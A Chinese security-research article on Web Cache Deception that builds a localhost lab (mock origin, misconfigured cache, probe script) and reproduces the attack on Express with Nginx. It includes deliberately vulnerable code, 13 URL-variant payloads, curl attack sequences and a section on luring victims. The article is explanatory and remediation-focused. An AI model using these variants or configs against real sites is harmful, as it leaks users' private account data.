---
title: 【先知】Web Cache Deception:URL 规范化错位下的变体验证
source: https://xz.aliyun.com/news/92808
source_host: xz.aliyun.com
clip_date: 2026-09-11T13:44:32+08:00
trace_id: 8ed2728d-cd76-4673-9e6f-710f5f24c5ab
content_hash: 0976d1b207d9d11970a2ee8080b3e937c3c1b424f26a5f0abffab0ee34314022
status: synced
tags:
  - 先知
  - 漏洞分析
  - 网络工具
series: null
feed_source: 先知安全技术社区
ai_summary: WCD 的成因不在缓存本身，而是 CDN 缓存判定与源站路由归一化对同一个 URL 给出不同语义，私有响应因此落入公共缓存。
ai_summary_style: key-points
images_status:
  total: 19
  succeeded: 19
  failed_urls: []
notion_page_id: 3d875244-d011-816f-a803-ca5e27cdc652
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> WCD 的成因不在缓存本身，而是 CDN 缓存判定与源站路由归一化对同一个 URL 给出不同语义，私有响应因此落入公共缓存。
> 
> - **成立三条件：** 源站把变体 URL 归一化后路由到私有接口；CDN 认为该 URL 值得缓存；缓存键不做规范化，使变体成为独立且攻击者可预测的缓存条目。
> - **源站六条宽容归一化：** 分号后截断、格式后缀剥离、独立扩展段忽略、百分号解码、重复斜杠合并、大小写不敏感；实测 `/api/me/;.css`、`/api/me.css`、`%2F`、`//api/me` 等 7 个变体全部命中 `/api/me`。
> - **变体矩阵结果：** sniff 静态后缀嗅探模式 13 个变体成立 10 个（尾斜杠／大小写／双斜杠不被缓存）；切换 cacheall 全量缓存后 13/13 成立，且无需任何变体，受害者访问 `/api/me` 即被缓存。
> - **真实栈差异：** Express 5 + Nginx（`proxy_cache_key $request_uri`、`proxy_cache_valid 200`）下仅 5 个变体有效，因前缀挂载要求尾斜杠、编码斜杠不参与匹配 —— 变体是否成立取决于具体框架。
> - **修复分层：** 私有接口强制 `Cache-Control: private, no-store`；缓存键规范化并拒绝归一化后落在私有路径的命中；私有路由精确匹配（`normalize(path) != path` 即拒绝）；CDN 静态判定只看 path；CI 以 `probe.py` 做变体回归告警。

## 一、WCD 是什么

Web Cache Deception(WCD,Web 缓存欺骗)是一条“诱导 + 缓存”的链:攻击者构造一个“看起来像静态资源”的 URL,诱导已登录的受害者访问;源站把它当成私有接口,返回敏感数据;源站前面的 CDN 却因为 URL 长得像静态文件,把这份私有响应缓存了下来。之后攻击者匿名访问同一个 URL,直接命中缓存,拿到受害者的数据。

这类问题在真实世界出现过不止一次:2019 年 GitHub 的 HackerOne 公开报告(以 `;.css` 结尾的 URL 触发私有页面缓存),2022 年 Cloudflare 官方博客的专项分析,以及各 SRC / HackerOne 平台上至今还在提交的 `;.css` 、 `/;/` 、大小写、重复斜杠等变体。

最反直觉的一点是:**整条链里没有任何一个环节“做错了”**。浏览器原样发送 URL,CDN 按自己的规则缓存,源站按自己的规则路由,每个角色都正常工作。问题出在三个角色对同一个 URL 的“看法”不一样,私有数据就掉进了缓存。

## 二、从一次攻击看完整链路

**目录结构，源码文件：**

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1f6bfde8a7ea1e69.png)

origin.py源码：

```plain
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
import re
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

USERS = {
    "victim": {"name": "张三", "email": "zhangsan@bank.example",
               "balance": 88420.50, "phone": "138****1234", "card": "6222 **** **** 8871"},
    "admin":  {"name": "管理员", "email": "admin@bank.example",
               "balance": 9999999.00, "phone": "139****0000", "card": "6222 **** **** 0001"},
}
STATIC_EXT = ("css", "js", "png", "jpg", "jpeg", "gif", "svg", "ico", "woff", "woff2", "ttf")


def normalize_path(raw_path: str) -> str:
    # R4 百分号解码(一次)
    p = urllib.parse.unquote(raw_path)
    # R1 矩阵参数:每个路径段内 ";" 及之后的内容被忽略
    p = "/".join(seg.split(";", 1)[0] for seg in p.split("/"))
    # R2 格式后缀:末尾段 "name.ext" 且 ext 为常见静态扩展名 → "name"
    segs = p.split("/")
    if len(segs) > 1 and segs[-1]:
        last, dot = segs[-1], segs[-1].rfind(".")
        if dot > 0 and last[dot + 1:].lower() in STATIC_EXT:
            segs[-1] = last[:dot].rstrip(".")
    p = "/".join(segs)
    # R3 独立扩展段:末尾 "/.ext" 段被忽略
    changed = True
    while changed:
        changed = False
        for e in STATIC_EXT:
            if p.endswith("/." + e):
                p = p.rsplit("/", 1)[0]
                changed = True
    # R5 重复斜杠合并
    p = re.sub(r"/{2,}", "/", p)
    # 去掉结尾多余的 "/"
    if p != "/":
        p = p.rstrip("/")
    return p or "/"


class Origin(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *args):  # 静默访问日志
        pass

    def do_GET(self):
        raw = self.path.split("?")[0]      # 路由只看路径,忽略 query
        norm = normalize_path(raw)
        fix = os.environ.get("WCD_FIX", "") 

        if fix == "strict":
            # 任何"需要归一化才能命中私有路径"的变体 URL 一律 403
            if raw == "/api/me":
                self._handle_me()
                return
            if norm == "/api/me":
                self._send(403, "text/plain",
                           "403 Forbidden: URL variant of private endpoint rejected",
                           "no-store")
                return
        elif norm.lower() == "/api/me":
            self._handle_me()
            return

        if norm.startswith("/static/") or norm == "/favicon.ico":
            self._send(200, "text/css" if norm.endswith(".css") else "text/plain",
                       "/* static */", None)
        elif norm == "/":
            html = ("<html><head><title>银行 · 登录</title></head><body>"
                    "<h1>欢迎使用测试银行</h1><p>登录后访问 <code>/api/me</code> 查看账户。</p>"
                    "</body></html>")
            self._send(200, "text/html; charset=utf-8", html, None)
        else:
            self._send(404, "text/plain", "404 Not Found", "no-store")

    def _handle_me(self):
        """私有接口:需要会话 Cookie 才返回数据。"""
        fix = os.environ.get("WCD_FIX", "")
        cookies = self.headers.get("Cookie", "")
        if "session=victim" in cookies:
            u = USERS["victim"]
        elif "session=admin" in cookies:
            u = USERS["admin"]
        else:
            self._send(401, "application/json",
                       json.dumps({"error": "unauthorized", "why": "no session cookie"}),
                       "no-store")
            return
        body = json.dumps(u, ensure_ascii=False, indent=2)
        if fix == "nostore":
            self._send(200, "application/json", body, "private, no-store")
        else:
          self._send(200, "application/json", body, None)

    def _send(self, status, ctype, body, cache_control):
        body = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        if cache_control:
            self.send_header("Cache-Control", cache_control)
        self.send_header("X-Origin-Norm", normalize_path(self.path.split("?")[0]))
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


if __name__ == "__main__":
    print("[origin] 源站已启动 http://127.0.0.1:9000 (私有接口 /api/me)")
    ThreadingHTTPServer(("127.0.0.1", 9000), Origin).serve_forever()
```

cache.py源码：

```plain
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ORIGIN_HOST, ORIGIN_PORT = "127.0.0.1", 9000
MODE = os.environ.get("WCD_MODE", "sniff")

CACHE = {}                      # cache_key -> dict(body, ctype, status, has_cookie, xnorm)
LOCK = threading.Lock()

# 静态扩展名嗅探:对【解码后】的完整 URI 做正则
STATIC_RE = re.compile(r"\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf)$", re.I)

def looks_static(uri: str) -> bool:
    """静态判定:解码后含 ";"(矩阵参数)或以静态扩展名结尾。"""
    decoded = urllib.parse.unquote(uri)
    return ";" in decoded or bool(STATIC_RE.search(decoded))

def looks_static_path_only(uri: str) -> bool:
    """修复版静态判定:只对 path 部分嗅探,忽略 query。"""
    return looks_static(uri.split("?", 1)[0])

def cache_key(uri: str) -> str:
    """缓存键:原始 URI,不做规范化"""
    return uri

class Cdn(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *args):  # 静默,调试信息统一打到 stderr
        pass

    def do_GET(self):
        key = cache_key(self.path)
        with LOCK:
            hit = CACHE.get(key)

        if hit is not None:
            # —— 缓存命中:无论请求者是谁,返回缓存的(可能来自受害者)响应 ——
            self.send_response(hit["status"])
            self.send_header("Content-Type", hit["ctype"])
            self.send_header("X-Cache", "HIT")
            self.send_header("X-Cache-Key", key)
            if hit.get("xnorm"):
                self.send_header("X-Origin-Norm", hit["xnorm"])
            self.send_header("Content-Length", str(len(hit["body"])))
            self.end_headers()
            self.wfile.write(hit["body"])
            sys.stderr.write(f"[CDN:{MODE}] HIT  {self.path} "
                             f"(内容来自{'受害者' if hit['has_cookie'] else '匿名'}请求)\n")
            return

        # —— 缓存未命中:转发到源站 ——
        upstream = f"http://{ORIGIN_HOST}:{ORIGIN_PORT}{self.path}"
        try:
            req = urllib.request.Request(upstream)
            if self.headers.get("Cookie"):
                req.add_header("Cookie", self.headers["Cookie"])
            resp = urllib.request.urlopen(req, timeout=5)
            body = resp.read()
            status = resp.status
            ctype = resp.headers.get("Content-Type", "application/octet-stream")
            xnorm = resp.headers.get("X-Origin-Norm")
        except urllib.error.HTTPError as e:
            body = e.read()
            status = e.code
            ctype = e.headers.get("Content-Type", "text/plain")
            xnorm = e.headers.get("X-Origin-Norm")
        except Exception as e:  # 源站不可达等
            body = str(e).encode("utf-8", "replace")
            status = 502
            ctype = "text/plain"
            xnorm = None

        # —— 缓存决策(误配置核心) ——
        cache_it = False
        if status == 200 and MODE == "sniff" and looks_static(self.path):
            cache_it = True
        elif status == 200 and MODE == "sniff_path" and looks_static_path_only(self.path):
            cache_it = True
        elif status == 200 and MODE == "cacheall":
            cache_it = True

        if cache_it:
            with LOCK:
                CACHE[key] = {
                    "body": body, "ctype": ctype, "status": status,
                    "has_cookie": bool(self.headers.get("Cookie")),
                    "xnorm": xnorm,
                }
            sys.stderr.write(f"[CDN:{MODE}] STORE {self.path} "
                             f"({'带受害者 Cookie' if self.headers.get('Cookie') else '匿名'})\n")

        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("X-Cache", "MISS" if not cache_it else "STORED")
        self.send_header("X-Cache-Key", key)
        if xnorm:
            self.send_header("X-Origin-Norm", xnorm)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

if __name__ == "__main__":
    print(f"[CDN:{MODE}] 缓存代理已启动 http://127.0.0.1:8000 -> 源站 {ORIGIN_HOST}:{ORIGIN_PORT}")
    ThreadingHTTPServer(("127.0.0.1", 8000), Cdn).serve_forever()
```

probe.py源码：

```plain
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import urllib.error
import urllib.request

CDN = os.environ.get("CDN", "http://127.0.0.1:8000")
COOKIE = "session=victim"
PRIV_MARK = '"balance"'  # 私有数据特征(源站返回的 JSON 包含 balance 字段)

# (名称, 变体 URI)—— 变体即"诱导受害者点击的 URL"
VARIANTS = [
    ("经典: /api/me/;.css",          "/api/me/;.css"),
    ("矩阵参数: /api/me;.css",       "/api/me;.css"),
    ("格式后缀: /api/me.css",        "/api/me.css"),
    ("独立扩展段: /api/me/.css",     "/api/me/.css"),
    ("编码分号: /api/me%3B.css",     "/api/me%3B.css"),
    ("编码斜杠: /api/me%2F.css",     "/api/me%2F.css"),
    ("编码点: /api/me%2Ecss",        "/api/me%2Ecss"),
    ("多点后缀: /api/me..css",       "/api/me..css"),
    ("query 静态后缀: ?foo=.css",    "/api/me?foo=.css"),
    ("query 回调: ?callback=.css",   "/api/me?callback=.css"),
    ("结尾斜杠: /api/me/",           "/api/me/"),
    ("大小写: /API/ME",              "/API/ME"),
    ("双斜杠: //api/me",             "//api/me"),
]


def fetch(uri: str, cookie: str | None = None):
    req = urllib.request.Request(CDN + uri)
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        r = urllib.request.urlopen(req, timeout=5)
        return r.status, r.headers.get("X-Cache", "-"), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get("X-Cache", "-"), e.read().decode("utf-8", "replace")
    except Exception as e:
        return "ERR", "-", str(e)


def main():
    print(f"目标 CDN : {CDN}")
    print(f"受害者   : Cookie={COOKIE}    私有标记: {PRIV_MARK}\n")
    print(f"{'变体':<28}{'受害者 状态/X-Cache':<24}{'匿名 状态/X-Cache':<24}判定")
    print("-" * 88)
    for name, uri in VARIANTS:
        vs, vc, vb = fetch(uri, COOKIE)      # 1) 受害者
        as_, ac, ab = fetch(uri)             # 2) 匿名
        wcd = (vs == 200 and PRIV_MARK in vb
               and as_ == 200 and PRIV_MARK in ab and ac == "HIT")
        verdict = "[+] WCD 成立" if wcd else \
                  ("[-] 未泄露" if as_ in (401, 404, 403) else "[!] 已缓存但无私有数据")
        print(f"{name:<28}{str(vs)+' '+vc:<24}{str(as_)+' '+ac:<24}{verdict}")


if __name__ == "__main__":
    main()
```

启动源站(127.0.0.1:9000)

```bash
python3 origin.py
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f35ea8434f195777.png)

启动 CDN(sniff 模式),127.0.0.1:8000

```plain
WCD_MODE=sniff python3 cache.py
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d9dd4a096cc93486.png)

确认两个服务就绪

```plain
curl -s -b "session=victim" "http://127.0.0.1:9000/api/me"  
curl -s -i "http://127.0.0.1:8000/api/me" | head -3       
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b8b794756ddf30dc.png)

先看最经典的变体 `/api/me/;.css` 。

**受害者(带 Cookie)访问被诱导的 URL:**

```plain
curl -s -i -b "session=victim" "http://127.0.0.1:8000/api/me/;.css"
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/651507fb9c09dc65.png)

CDN 日志:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/93028fdbb81abb57.png)

**攻击者(未登录)请求同一 URL:**

```plain
curl -s -i "http://127.0.0.1:8000/api/me/;.css"
```

未带 Cookie 却拿到同一份私有数据。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/543acd8803cdb6b2.png)

CDN 日志:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cfbded633dc104d8.png)

**负向对照:攻击者直接请求 /api/me:**

```plain
curl -s -i "http://127.0.0.1:8000/api/me"
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c6b4287634af67ae.png)

这一步证明的是攻击者本身没有任何权限,数据 100% 来自 CDN 缓存。 `X-Cache` 从 STORED 变成 HIT,加上最后的 401,完整链路是:诱导 → 缓存 → 公开化。

把这条链拆开看,一共五步。第一步,受害者带着 Cookie 请求 `/api/me/;.css`,响应头里 `X-Cache` 是 STORED。第二步,源站把变体归一化成 `/api/me`,返回私有数据 —— 响应头 `X-Origin-Norm: /api/me` 直接展示了这一步。第三步,CDN 判定这是静态请求,把响应缓存了下来,日志里明确写着“带受害者 Cookie”。第四步,攻击者匿名请求同一个 URL,拿到 `X-Cache: HIT` 。第五步,攻击者拿到了受害者的余额和卡号。这五步里最微妙的是第三步和第四步之间:CDN 缓存的内容来自受害者的请求,而攻击者只是“借用”了这条缓存 —— 源站从头到尾只处理过一次请求。

## 三、抓包视角:攻击者的请求没有回源

“数据来自缓存”这里用 tcpdump 验证:

```plain
tcpdump -i lo -nn -s 0 -w /tmp/wcd.pcap 'port 8000 or port 9000' &
curl -s -b "session=victim" "http://127.0.0.1:8000/api/me/;.css" -o /dev/null   # 受害者
curl -s "http://127.0.0.1:8000/api/me/;.css" -o /dev/null                       # 攻击者
curl -s "http://127.0.0.1:8000/api/me" -o /dev/null                             # 负向对照
```

抓包结果:

```plain
kill %1
sleep 1
# 9000 端口(CDN↔源站):
tcpdump -r /tmp/wcd.pcap -nn -A 'tcp port 9000' | strings | grep -aE "GET |HTTP/1.1|Cookie:|balance"

# 8000 端口(客户端↔CDN):
tcpdump -r /tmp/wcd.pcap -nn -A 'tcp port 8000' | strings | grep -aE "GET |HTTP/1.1|Cookie:|X-Cache"
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6056a32eab72ddb4.png)

攻击者在 9000 端口没有任何流量 —CDN 直接命中缓存返回。这既是攻击成功的证据,也是它难以被源站侧检测的原因。

## 四、同一个 URL,三个角色三种看法

**浏览器眼里的 URL:是什么就是什么。** 受害者点击链接或加载资源时,URL 原样进入请求行。 `<a>` 链接、 `<img>` / `<link>` 资源加载、短链、二维码都能把受害者引过去,只要他处于已登录状态。浏览器不会“修正” URL,它原样发送。

**CDN 眼里的 URL:两个判定。** 第一个判定是该不该缓存。正确做法是看源站返回的 Cache-Control 头,但真实世界有两种常见误配置。第一种是静态后缀嗅探:URL 以 `.css` 、`.js` 、`.png` 这类扩展名结尾、或者路径里含一个分号,CDN 就认为这是静态资源,直接缓存,根本不看源站说了什么 —— 不少 CDN 产品的“自动静态缓存”开关就是这么实现的。第二种更彻底,叫全量缓存:所有返回 200 的 GET 请求全都缓存,同样无视 Cache-Control —— Nginx 的 `proxy_cache` 配成 `proxy_cache_valid 200` 之后就是这个行为,部分云 CDN 的“缓存一切”策略也是。两种误配置有一个共同点:它们都用自己的规则做判断,而不是信任源站的语义。

第二个判定是缓存键。常见缺陷是直接用原始请求 URI 当缓存键 —— 于是 `/api/me/;.css` 和 `/api/me` 是两个完全独立的缓存条目,前者是“静态文件”条目,后者是“私有接口”条目。

**源站眼里的 URL:宽容归一化。** 源站框架为了“用户体验”,普遍对 URL 做宽容匹配,常见行为可以归纳成六条。第一条,分号参数:路径段里 `;` 及之后的内容被忽略,`/api/me;.css` 会被当成 `/api/me` —— 经典 `;.css` 变体依赖的就是这条。第二条,格式后缀:末尾的 `name.ext` 剥成 `name`,`/api/me.css` 变成 `/api/me` 。第三条,独立扩展段:末尾的 `/.ext` 段被忽略,`/api/me/.css` 变成 `/api/me` 。第四条,百分号解码:先解码再匹配,`%3B` 、 `%2F` 、 `%2E` 这些编码变体解码后落到前三条上。第五条,重复斜杠合并:`//api/me` 变成 `/api/me`,这是 Nginx `merge_slashes` 的默认行为。第六条,大小写不敏感:`/API/ME` 也能命中 `/api/me`,Express 默认就是这样。

直接验证一下这六条规则:带受害者 Cookie 直连源站,看 7 个变体的归一化结果:

```plain
$ for u in "/api/me/;.css" "/api/me.css" "/api/me%2F.css" "/api/me/" "/API/ME" "//api/me" "/api/me?foo=.css"; do
    curl -s -b "session=victim" -o /dev/null -D - "http://127.0.0.1:9000$u" | grep -e "HTTP/" -e "X-Origin-Norm"
  done
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/522eea5cb90ffb5e.png)

```plain
/api/me/;.css -> /api/me
/api/me.css   -> /api/me
/api/me%2F.css-> /api/me
/api/me/      -> /api/me
/API/ME       -> 命中(比较不敏感,保留原样大小写)
//api/me      -> /api/me
/api/me?foo=.css -> 路由只看 path
```

7 个变体全部被源站当作私有接口 `/api/me` 处理 —— 这就是“宽容归一化”的实际效果。

**WCD 成立需要同时满足三个条件:**

> 1.  源站把变体 URL 归一化后路由到私有接口;
> 2.  CDN 认为这个 URL 值得缓存;
> 3.  缓存键不做规范化,变体 URL 成为独立且攻击者可预测的缓存条目。

## 五、用 probe.py 把变体家族穷举出来

`;.css` 只是冰山一角。 `probe.py` 对 13 个变体统一测试:先以受害者身份请求,再以匿名身份请求,判定“匿名是否命中缓存拿到私有数据”。

判定逻辑:

```python
wcd = (vs == 200 and PRIV_MARK in vb      # 受害者拿到私有数据
       and as_ == 200 and PRIV_MARK in ab # 匿名也拿到
       and ac == "HIT")                   # 且匿名来自缓存命中
```

**sniff 模式(静态后缀嗅探)下的完整结果:**

```plain
python3 probe.py
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/77762414a410fc44.png)

10/13 成立。 **未命中的三个变体说明了：** 它们能骗过源站,但骗不过 CDN 的静态判定 —— 不以静态扩展名结尾、不含 `;`,CDN 拒绝缓存,匿名请求只能拿到源站的 401。

**切换至cacheall模式：**

```plain
WCD_MODE=cacheall python3 cache.py
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b44389ff22d5ff2f.png)

**cacheall 模式(全量缓存)下的完整结果:**

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f4a4edc9d22730a9.png)

**cacheall 模式(全量缓存)下 13/13 全部成立**,而且连变体都不需要:受害者访问 `/api/me` 本身就会被缓存,攻击者匿名访问直接命中。这种“缓存一切”的配置是 WCD 最致命的形态。

这 13 个变体按“家族”分,规律很清楚。分号家族三个,都是 R1 把分号之后的内容剥掉,CDN 又因为解码后路径里含分号判定为静态。编码家族三个,都是 R4 先解码、再落回分号或后缀规则。后缀家族三个(`.css` 格式后缀、 `/.css` 独立段、`..css` 多点),CDN 只看字符串结尾是不是静态扩展名,完全不管中间是什么。query 家族两个,源站路由只看 path 所以命中私有接口,而 CDN 静态判定的对象是含 query 的完整 URI,所以也命中 —— 这个家族是后面修复实验里最难缠的。剩下三个 —— 尾斜杠、大小写、双斜杠 —— 源站都能归一化到 `/api/me`,但 CDN 判定它们不像静态资源,sniff 模式下不缓存,这就是“骗得过源站、骗不过 CDN”的那三个。

最后这三个在 cacheall 模式下全部成立,说明它们的唯一防线就是 CDN 的静态判定,这层一松,后面全垮。 **换一种 CDN 配置就失效,不是修复,而是转移。**

## 六、真实框架复现:Express + Nginx

使用真实组件交叉验证,最小真实栈(`lab-real/`):

-   源站:Express 5.2.1,`app.use('/api/me', ...)` 前缀挂载私有接口,带会话 Cookie 才返回数据,不设Cache-Control;
-   缓存层:Nginx 1.26.0 + `proxy_cache`,缓存键用原始 URI `$request_uri`,`proxy_cache_valid 200 10m` 全量缓存。

**源站代码:**

```javascript
// app.js — Express 源站:/api/me 前缀挂载私有接口(带会话校验)
const express = require('express');
const app = express();
const USERS = {
  victim: { user: '张三', email: 'zhangsan@bank.example', balance: 88420.5, card: '6222 **** **** 8871' },
  admin:  { user: '管理员', email: 'admin@bank.example', balance: 9999999.0, card: '6222 **** **** 0001' },
};
// 私有接口:前缀挂载 —— 任何以 /api/me 开头的路径都会进入该处理器
app.use('/api/me', (req, res) => {
  console.error(`[origin] path=${req.path} cookie=${req.headers.cookie || '(无)'}`);
  const cookies = req.headers.cookie || '';
  if (cookies.includes('session=victim')) res.json(USERS.victim);
  else if (cookies.includes('session=admin')) res.json(USERS.admin);
  else res.status(401).json({ error: 'unauthorized', why: 'no session cookie' });
});
app.get('/', (req, res) => res.send('<h1>银行登录页</h1>'));
app.listen(3000, '127.0.0.1', () => console.log('[origin] Express 源站已启动 :3000'));
```

**Nginx 配置:**

```nginx
worker_processes 1;
user root;                 
error_log nginx-error.log warn;
pid nginx.pid;
events { worker_connections 1024; }
http {
    proxy_cache_path cache levels=1:2 keys_zone=wcd:10m max_size=50m inactive=10m;
    server {
        listen 8080;
        server_name _;
        merge_slashes on;
        location / {
            proxy_pass http://127.0.0.1:3000;            # 无 URI:按原始 URI 转发上游
            proxy_set_header Cookie $http_cookie;
            proxy_cache wcd;
            proxy_cache_key $scheme$proxy_host$request_uri;  # 原始 URI 当缓存键
            proxy_cache_valid 200 10m;                       # 所有 200 都缓存
            add_header X-Cache $upstream_cache_status always;
        }
    }
    server {                      
        listen 8081;
        server_name _;
        merge_slashes on;
        location / {
            proxy_pass http://127.0.0.1:3000/;
            proxy_set_header Cookie $http_cookie;
            proxy_cache wcd;
            proxy_cache_key $scheme$proxy_host$request_uri;
            proxy_cache_valid 200 10m;
            add_header X-Cache $upstream_cache_status always;
        }
    }
}
```

这段配置里两个“误配置点”都是真实的:`proxy_cache_key` 用 `$request_uri` (原始 URI,不做规范化),`proxy_cache_valid 200 10m` 让所有 200 都进缓存。

**手动运行:**

```bash
npm install express    
node app.js

nginx -p "$PWD" -c nginx-wcd.conf
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ffbd6c2041afd2ee.png)

验证是否成功启动：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e3a90eac6d631c8b.png)

**真实栈上的攻击链:**

```plain
curl -s -i -b "session=victim" "http://127.0.0.1:8080/api/me/;.css" | grep -e "HTTP/" -e "X-Cache"
curl -s -i "http://127.0.0.1:8080/api/me/;.css" | grep -e "HTTP/" -e "X-Cache"
curl -s -i "http://127.0.0.1:8080/api/me" | grep -e "HTTP/" -e "X-Cache"
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fbce3fbc2c92a6ed.png)

**源站日志，证明攻击者的匿名请求没回源:**

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a390db0766c2736d.png)

**双斜杠变体对照(8080 vs 8081)：**

```plain
curl -s -o /dev/null -w "%{http_code}\n" -b "session=victim" "http://127.0.0.1:8080//api/me"
curl -s -i -b "session=victim" "http://127.0.0.1:8081//api/me" | grep -e "HTTP/" -e "X-Cache"
curl -s -i "http://127.0.0.1:8081//api/me" | grep -e "HTTP/" -e "X-Cache"
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/555107b29dee3f04.png)

**真实框架下的变体表现:** 成立的有五个 —— `/api/me/;.css` 、 `/api/me/.css` 、 `/api/me/` 、 `/api/me?foo=.css` 和 `/API/ME`,最后一个成立是因为 Express 默认大小写不敏感。不成立的有四个:`/api/me;.css` 和 `/api/me.css` 返回 404,因为 Express 5 的前缀挂载要求挂载路径之后必须是斜杠或结尾,无尾斜杠的形式直接被拒;`%2F.css` 也返回 404,因为编码斜杠没有参与解码匹配;双斜杠 `//api/me` 在 8080 端口返回 404,因为无 URI 的 `proxy_pass` 按原样转发,上游拿到 `//api/me` 匹配不上前缀。模拟环境里成立的 10 个,真实栈上只成立 5 个 —— 这个差异本身就是重要的结论:变体是否有效,取决于具体框架。

## 七、根因与排查

**根因:缓存判定和路由判定没有收敛。** 浏览器原样发送、CDN 凭字符串外观判定、源站做宽容归一化,三者对“同一个 URL 是什么”给出三种答案,私有数据就顺着这道缝隙掉进公共缓存。

判断一个站点有没有 WCD 风险,不需要等到真实攻击,问三个问题:

> 1.  源站有没有私有接口能被变体 URL 命中?(六条规则任一条)
> 2.  CDN 会不会缓存“看起来静态”或“所有 200”的响应?
> 3.  缓存键做不做规范化?

三个答案里有两个“是”,攻击面就存在。

排查现有服务时,按“CDN 模式 × 源站路由”对号入座。CDN 侧:如果只缓存自己托管的静态目录(`/static/` 、 `/assets/`),变体 URL 根本不在静态判定范围内,低危;如果自动缓存“静态后缀”且无视 Cache-Control,那 `;.css` 家族直接成立,高危;如果缓存一切 200,那连变体都不需要,极高危。源站侧反过来看:私有接口如果是精确匹配,变体 URL 到不了私有路由;如果用了前缀挂载 `/api/*`,变体 URL 直接命中。高危组合很清楚:**CDN 静态判定松 + 源站前缀挂载**。

## 八、修复

防御要分层打,每一层解决一类问题。按下面的顺序逐层修复:

1.  **响应头:私有接口显式声明不可缓存。** 所有返回私有/会话数据的接口,必须返回 `Cache-Control: private, no-store` 。这是第一层 —— 面对无视 Cache-Control 的 CDN 配置,单独靠它不够;
2.  **缓存键规范化:拒绝“归一化后是私有路径”的命中。** CDN 命中缓存前,把请求 URL 按与源站相同的归一化规则处理一次,若结果命中私有路径(如 `/api/` 前缀),直接回源且不缓存;缓存键本身也用规范化后的路径,避免同一资源出现多个独立条目;
3.  **路由层:私有接口精确匹配。** 拒绝任何带分号参数、格式后缀、独立扩展段、编码变体、重复斜杠、大小写变体的路径;更省事的做法是反向校验 —— `normalize(path) != path` 的请求一律拒绝,任何需要归一化才能命中的都不予匹配;
4.  **CDN 配置:静态判定收紧。** 关闭“自动静态缓存”或限定静态路径范围(只缓存 `/static/` 、 `/assets/` 等托管目录);静态判定不得对完整 URI(含 query)做正则,只针对 path;对 `/api/` 、 `/account/` 等私有前缀做缓存例外 —— 永远不缓存、永远不命中缓存;
5.  **CI 防回归:变体矩阵接入流水线。** `python3 probe.py | grep "WCD 成立" && exit 1`,并定期对预发/生产 CDN 做只读探测(匿名请求 + 判断是否返回本不应公开的内容);
6.  **框架级默认策略。** 平台层面把“登录态响应默认不可缓存”做成默认行为(Spring 全局 CacheControl、Next.js 动态渲染默认 `private, no-store` 等),避免每个接口都依赖开发者自觉。

## 九、攻击者视角

**诱导链。** WCD 需要受害者已登录,再点击一次。常见投放方式有三种:钓鱼链接或短链,跳转到 `https://bank.example/api/me/;.css`;攻击者自己页面里的 `<img>` 或 `<link>` 资源加载 —— 受害者只要已登录银行并打开攻击者页面,浏览器会自动带上 Cookie 发出请求;二维码和线下诱导同理。关键是受害者必须处于登录态,所以攻击者会优先选活跃用户,或批量投放覆盖大量可能已登录的人。

**提权链。** 直接泄露的是“受害者当前会话可读的数据”,但危害往往不止于此。响应里可能带预签 URL、临时令牌、会话级 CSRF Token、密码重置链接 —— 拿到这些,攻击者能在有效期内以受害者身份继续操作。再进一步,手机号、身份证、银行卡号这些个人信息可以拿去撞库、社工、精准钓鱼。如果泄露的接口恰好和 `/api/orders` 、 `/api/transfer` 这类写接口挨着,还能把读越权升级成写越权。整条链不依赖任何客户端漏洞,不需要 XSS,全部由服务端配置缺陷加一次点击完成。

**自动化探测。** 手动逐个试变体不现实,`probe.py` 把“受害者请求 → 匿名请求 → 判定”自动化,几秒输出完整矩阵。扩展新变体只需在 `VARIANTS` 列表里加一行。它还能当防回归工具:接入 CI,定期对预发/生产 CDN 跑一遍,任何一个变体出现“HIT + 私有标记”就告警。

